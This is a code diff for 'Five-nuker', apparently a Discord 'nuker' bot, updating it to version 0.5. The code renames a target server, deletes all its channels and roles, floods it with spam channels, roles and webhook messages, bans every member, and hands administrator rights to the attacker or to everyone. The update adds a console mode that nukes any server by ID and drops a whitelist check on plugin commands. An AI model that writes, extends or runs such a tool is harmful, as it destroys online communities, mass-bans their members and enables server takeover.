@@ -51,7 +51,7 @@ if os.path.exists("updated"):
     clear()
 
 if __name__ == '__main__':
-    local_version = str("0.4_hf2")
+    local_version = str("0.5")
 
     http = urllib3.PoolManager()
 
@@ -62,10 +62,10 @@ if __name__ == '__main__':
     if not local_version == get_last_ver:
         drawer.Center("New version of Five-nuker avaible!")
         drawer.Center(f"{local_version} -> {get_last_ver}")
-        if os.name == "nt":
+        if os.name == "nt" and os.path.exists("_five-nuker-contents-dir"):
             start_update()
         else:
-            Center("Opening a page with download and with a changelog after a few seconds...")
+            drawer.Center("Opening a page with download and with a changelog after a few seconds...")
             sleep(3)
             webbrowser.open("https://github.com/glitch65/Five-nuker/releases")
 
@@ -91,15 +91,19 @@ def_cfg = {
                 "token": "TOKENHERE",
                 "prefix": "!",
                 "nuke_prefix": ".",
-                "names_of_channels_and_roles": ["Paste here your channel names"],
+                "names_of_channels_and_roles": ["Paste","here", "your", "channel", "names"],
                 "name_of_webhooks": "Five Nuker",
+                "names_of_roles": ["Paste","here", "your", "roles", "names"],
                 "spam_text": "Paste here your spam text",
                 "spam_mode": 1,
                 "channels_create_count": 10,
+                "roles_create_count": 10,
                 "spam_in_channel_count": 10,
+                "cmd mode": False,
                 "server_name": "Nuked by Five Nuker",
                 "whitelisted_ids": [1207760690899849350, 743781026534260836],
                 "only_whitelisted_users_can_perform_actions": False,
+                "only_whitelisted_people_can_activate_the_command_prompt": True,
                 "Enable logging?": False,
                 "Ban on server nuke?": True,
                 "ban_reason": "XDDDDDDDDDDDDDDDDDDDDDDDD",
@@ -170,13 +174,17 @@ list_of_settings = ["token",
                             "nuke_prefix",
                             "names_of_channels_and_roles",
                             "name_of_webhooks",
+                            "names_of_roles",
                             "spam_text",
                             "spam_mode",
                             "channels_create_count",
+                            "roles_create_count",
                             "spam_in_channel_count",
+                            "cmd mode",
                             "server_name",
                             "whitelisted_ids",
                             "only_whitelisted_users_can_perform_actions",
+                            "only_whitelisted_people_can_activate_the_command_prompt",
                             "Enable logging?",
                             "Ban on server nuke?",
                             "ban_reason",
@@ -197,7 +205,7 @@ for setting in list_of_settings:
                         error = True
 if error == True:            
             clear()
-            drawer.Center("When checking the config, some bugs were found and corrected")
+            drawer.Center("When checking the config, some bugs were found and fixed")
             drawer.Center("This usually happens if there are missing lines in your config. This can be caused by a nuker update.")
             drawer.Center("It is recommended to check and change config")
             drawer.Center("To continue press the space bar on your keyboard...")
@@ -212,20 +220,21 @@ if not os.path.exists("cfg//themes"):
             os.mkdir("cfg//themes")
             with open(f"cfg/themes/default.json", "w") as theme:
                 json.dump(def_theme,theme,indent=3)
-            
-if themes_empty:
-    with open(f"cfg/themes/default.json", "w") as theme:
-                json.dump(def_theme,theme,indent=3)
-try:
-    with open(f"cfg/themes/{config["Selected_theme"]}.json", "r") as thm:
-        theme = json.loads(thm.read())
-except Exception as e:
-    print("failed to load theme :(")
-    print(f"{e}")
-    stop_nuker()        
+
+if __name__ == '__main__':            
+    if themes_empty:
+        with open(f"cfg/themes/default.json", "w") as theme:
+                    json.dump(def_theme,theme,indent=3)
+    try:
+        with open(f"cfg/themes/{config["Selected_theme"]}.json", "r") as thm:
+            theme = json.loads(thm.read())
+    except Exception as e:
+        print("failed to load theme :(")
+        print(f"{e}")
+        stop_nuker()        
 
 if __name__ == '__main__':
-    drawer.CenterColor(txt,theme["logo_pallete"], theme["logo_gradient_steps"],theme["logo_gradient_type"])
+    print(drawer.CenterColor(drawer.converting(theme["logo_pallete"]), theme["logo_gradient_steps"],txt,theme["logo_gradient_type"]))
     print(f"{F.GREEN}Config file loaded!{F.RESET}")
     
     if config["Enable logging?"] == False:
@@ -245,8 +254,9 @@ if __name__ == '__main__':
     async def on_ready():
         clear()
         os.system(f"title Five Nuker - Online - {bot.user} - ")
-        drawer.CenterColor(txt,theme["logo_pallete"], theme["logo_gradient_steps"],theme["logo_gradient_type"])
-        drawer.CenterColor(f"You loggen by {bot.user}",theme["logged_in_pallete"], theme["logged_in_gradient_steps"],theme["logged_in_gradient_type"])
+        if not cmd_mode:
+            print(drawer.CenterColor(text=txt,colors=drawer.converting(theme["logo_pallete"]), steps=theme["logo_gradient_steps"],type=theme["logo_gradient_type"]))
+            print(drawer.CenterColor(text=f"You loggen by {bot.user}",colors=drawer.converting(theme["logged_in_pallete"]), steps=theme["logged_in_gradient_steps"],type=theme["logged_in_gradient_type"]))
         if config["Activity_type"] == "playing" and config["invisible_mode"] == False:
             await bot.change_presence(activity=discord.Game(name=config["Activity_name"]))
         elif config["Activity_type"] == "listening" and config["invisible_mode"] == False:
@@ -257,12 +267,55 @@ if __name__ == '__main__':
             await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=config["Activity_name"]))
         elif config["Activity_type"] == None and config["invisible_mode"] == True:
             await bot.change_presence(status=discord.Status.offline)
-            drawer.CenterColor("Invisible mode enabled!",theme["invisible_mode_pallete"], theme["invisible_mode_steps"],theme["invisible_mode_type"])   
+            print(drawer.CenterColor(text="Invisible mode enabled!",colors=drawer.converting(theme["invisible_mode_pallete"]), steps=theme["invisible_mode_steps"],type=theme["invisible_mode_type"]))
         else:
-            drawer.CenterColor("ERROR!!! Activity_type must be playing, listening, streaming, watching or null. invisible_mode must be true or false. The bot's activity will not change and invisible mode will not be enabled",theme["activity_type_error_pallete"],theme["activity_type_error_steps"],theme["activity_type_error_gradient_type"])
+            print(drawer.CenterColor(text="ERROR!!! Activity_type must be playing, listening, streaming, watching or null. invisible_mode must be true or false. The bot's activity will not change and invisible mode will not be enabled",colors=drawer.converting(theme["activity_type_error_pallete"]),steps=theme["activity_type_error_steps"],type=theme["activity_type_error_gradient_type"]))
+        if cmd_mode:
+            await launch_cmd()
+        if not cmd_mode:        
+            drawer.Center(f"Message logs:")  
 
-        drawer.Center(f"Message logs:")  
+cmd_mode = config["cmd mode"]
 
+async def launch_cmd():
+        print(f"{drawer.gradientText([(156, 0, 245),(0,0,0)],len("Five nuker"),"Five nuker","H")} v{local_version} © G1itch, KotdemontoK")
+        print("")
+        while True:
+            cmd_command = input("Five nuker> ")
+            if cmd_command.startswith("help"):
+                    print("List of commands: \n")
+                    print("help - shows list of all commands \nquit - closes nuker \ncls - clear \nclear - same as cls \nnuke [server id] - nukes server \noff - disables command prompt mode thereby restoring the bot's functionality")
+            elif cmd_command.startswith("quit"):
+                    quit()
+            elif cmd_command.startswith("cls") or cmd_command.startswith("clear"):
+                    clear()
+                    print(f"{drawer.gradientText([(156, 0, 245),(0,0,0)],len("Five nuker"),"Five nuker","H")} v{local_version} ©G1itch, KotdemontoK")
+                    print("")
+            elif cmd_command.startswith("nuke"):
+                    server_id=cmd_command.split(" ")
+                    curent_guild = bot.get_guild(int(server_id[1]))
+                    await curent_guild.edit(name=config["server_name"], icon=icon)
+                    spamCount = config['spam_in_channel_count']
+                    channelsCreate = config['channels_create_count']
+                    print(drawer.gradientText(text=f"Nuking a {curent_guild.name}!\nSettings | SMPC (Spam Message Per Channel): {spamCount} | Channels Count: {channelsCreate}",colors=theme["nuke_started_pallete"], steps=theme["nuke_started_steps"],type=theme["nuke_started_gradient_type"]))
+                    create_task(delete_channels(curent_guild))
+                    create_task(delete_roles(curent_guild))
+                    for i in range(config["roles_create_count"]):
+                        multiprocessing.Process(target=start_roles_create(curent_guild)).start()
+                    for i in range(channelsCreate):
+                        multiprocessing.Process(target=start_channels_create(curent_guild)).start()
+                    if config["Ban on server nuke?"] == True:
+                        create_task(banAll(curent_guild))
+            elif cmd_command.startswith("off"):
+                print(f"Heartbeat unlocked! run {config["nuke_prefix"]}on in any server(if that bot is out there, of course), any channel, even in bot dm's \nto access the command prompt")          
+                if config["only_whitelisted_people_can_activate_the_command_prompt"]:
+                    print("\nKeep in mind that in the config only_whitelisted_people_can_activate_the_command_prompt is set to true! Only whitelisted people can activate the bot! When the command prompt mode is active the bot will not react to any commands!")
+                else:
+                    print("\nKeep in mind that in the config only_whitelisted_people_can_activate_the_command_prompt is set to false! Anyone can activate the command prompt mode and block the bot's work.")
+                break
+            else:
+                    print('Wrong command! Type help to see a list of commands!')
+  
 
 
 async def send_wb(object: discord.TextChannel):
@@ -286,6 +339,10 @@ async def create_channels(guild):
     except Exception as e:
         print(e)
 
+async def createrole(guild):
+    try: await guild.create_role(name=choice(config["names_of_roles"]))
+    except: pass
+
 async def delete_channels(guild: discord.Guild):
         for i in guild.channels:
             try:
@@ -304,8 +361,9 @@ async def delete_roles(guild: discord.Guild):
 
 
 async def banAll(ctx):
-    all_members_list = list(ctx.guild.members)
-    all_members_list.remove(ctx.author)
+    all_members_list = list(ctx.members)
+    if not cmd_mode:
+        all_members_list.remove(ctx.author)
     for i in config['whitelisted_ids']:
         try:
             all_members_list.remove(bot.get_user(i))
@@ -318,13 +376,13 @@ async def banAll(ctx):
 
 if __name__ == '__main__':
     @bot.event
-    async def on_message(message: discord.Message):    
+    async def on_message(message: discord.Message):   
         if message.author.bot:
             return
         msg = message.content
         cmd_name_witout_prefix = msg.split()[0][1:]
         if msg.startswith(config["nuke_prefix"]):
-            drawer.CenterColor(f"[{message.author}]:{msg}",theme["command_triggered_pallete"], len(f"[{message.author}]: {msg}"),theme["command_triggered_gradient_type"])
+            print(drawer.CenterColor(text=f"[{message.author}]:{msg}",colors=drawer.converting(theme["command_triggered_pallete"]), steps=len(f"[{message.author}]: {msg}"),type=theme["command_triggered_gradient_type"]))
             args = msg.split()
             if args[0] == config['nuke_prefix']+"nuke":
                 if config['only_whitelisted_users_can_perform_actions'] == True:
@@ -333,11 +391,13 @@ if __name__ == '__main__':
                         await message.guild.edit(name=config["server_name"], icon=icon)
                         spamCount = config['spam_in_channel_count']
                         channelsCreate = config['channels_create_count']
-                        drawer.CenterColor(f"Nuking a {message.guild.name}!\nSettings | SMPC (Spam Message Per Channel): {spamCount} | Channels Count: {channelsCreate}",theme["nuke_started_pallete"], theme["nuke_started_steps"],theme["nuke_started_gradient_type"])
+                        print(drawer.CenterColor(text=f"Nuking a {message.guild.name}!\nSettings | SMPC (Spam Message Per Channel): {spamCount} | Channels Count: {channelsCreate}",colors=drawer.converting(theme["nuke_started_pallete"]), steps=theme["nuke_started_steps"],type=theme["nuke_started_gradient_type"]))
                         create_task(delete_channels(message.guild,))
                         create_task(delete_roles(message.guild,))
+                        for i in range(config["roles_create_count"]):
+                            multiprocessing.Process(target=start_roles_create(curent_guild)).start()
                         for i in range(channelsCreate):
-                            multiprocessing.Process(target=start(curent_guild)).start()
+                            multiprocessing.Process(target=start_channels_create(curent_guild)).start()
                         if config["Ban on server nuke?"] == True:
                             create_task(banAll(message))
                 else:
@@ -345,11 +405,13 @@ if __name__ == '__main__':
                     await message.guild.edit(name=config["server_name"], icon=icon)
                     spamCount = config['spam_in_channel_count']
                     channelsCreate = config['channels_create_count']
-                    drawer.CenterColor(f"Nuking a {message.guild.name}!\nSettings | SMPC (Spam Message Per Channel): {spamCount} | Channels Count: {channelsCreate}",theme["nuke_started_pallete"], theme["nuke_started_steps"],theme["nuke_started_gradient_type"])
+                    print(drawer.CenterColor(text=f"Nuking a {message.guild.name}!\nSettings | SMPC (Spam Message Per Channel): {spamCount} | Channels Count: {channelsCreate}",colors=drawer.converting(theme["nuke_started_pallete"]), steps=theme["nuke_started_steps"],type=theme["nuke_started_gradient_type"]))
                     create_task(delete_channels(message.guild,))
                     create_task(delete_roles(message.guild,))
+                    for i in range(config["roles_create_count"]):
+                            multiprocessing.Process(target=start_roles_create(curent_guild)).start()
                     for i in range(channelsCreate):
-                        multiprocessing.Process(target=start(curent_guild)).start()
+                        multiprocessing.Process(target=start_channels_create(curent_guild)).start()
                     if config["Ban on server nuke?"] == True:
                         create_task(banAll(message))
             elif args[0] == config["nuke_prefix"]+"admin":
@@ -372,30 +434,52 @@ if __name__ == '__main__':
                             await message.delete()
                             for members in list(message.guild.members):
                                 await members.add_roles(r)
-            
+                else:
+                    if args[1] == "me":
+                            guild = message.guild
+                            get_bot = guild.get_member(bot.user.id)
+                            top_role = max(get_bot.roles, key=lambda r: r.position)
+                            r = await guild.create_role(name=config["admin_role_name"])
+                            await r.edit(position=top_role.position - 1, permissions=discord.Permissions(administrator=True))
+                            await message.author.add_roles(r)
+                            await message.delete()
+                    elif args[1] == "all":
+                            guild = message.guild
+                            get_bot = guild.get_member(bot.user.id)
+                            top_role = max(get_bot.roles, key=lambda r: r.position)
+                            r = await guild.create_role(name=config["admin_role_name"])
+                            await r.edit(position=top_role.position - 1, permissions=discord.Permissions(administrator=True))
+                            await message.delete()
+                            for members in list(message.guild.members):
+                                await members.add_roles(r)
+            elif args[0] == config["nuke_prefix"]+"on":
+                if config["only_whitelisted_people_can_activate_the_command_prompt"]:
+                    if message.author.id in config['whitelisted_ids']:
+                        await launch_cmd()          
+                else:
+                    await launch_cmd()
+
             elif args[0] != config['nuke_prefix']+"nuke" and  config["nuke_prefix"]+"admin":
                 if cmd_name_witout_prefix in globals():
                     if config["Enable_plugins?"] == True:
-                        if config['only_whitelisted_users_can_perform_actions'] == True:
-                            if message.author.id in config['whitelisted_ids']:
-                                    await globals()[cmd_name_witout_prefix](message)
-                        else:
-                                    await globals()[cmd_name_witout_prefix](message)
+                        await globals()[cmd_name_witout_prefix](message)
+      
 
+            
 
         elif msg.startswith(config["prefix"]):
-            drawer.CenterColor(f"[{message.author}]:{msg}",((0,255,255),(0,125,125),(0,255,255)), len(f"[{message.author}]: {msg}"),"H")
+            drawer.CenterColor(text=f"[{message.author}]:{msg}",colors=[(0,255,255),(0,125,125),(0,255,255)], steps=len(f"[{message.author}]: {msg}"),type="H")
         elif msg.startswith("@everyone") or msg.startswith("@here") or msg.startswith(f"<@{bot.user.id}>"):
-            drawer.CenterColor(f"[{message.author}]:{msg}",[(255,255,0),(125,125,0),(255,255,0)], len(f"[{message.author}]: {msg}"),"H")
+            drawer.CenterColor(text=f"[{message.author}]:{msg}",colors=[(255,255,0),(125,125,0),(255,255,0)], steps=len(f"[{message.author}]: {msg}"),type="H")
         else:
             drawer.Center(f"[{message.author}]: {msg}")
 
-def start(guild):
-    
+def start_roles_create(guild):
+    create_task(createrole(guild))
+
+def start_channels_create(guild):
     create_task(create_channels(guild))
 
-def process():
-    multiprocessing.Process(target=start).start()
 if __name__ == '__main__':
     if config["Enable_plugins?"] == True:
         load_plugins()
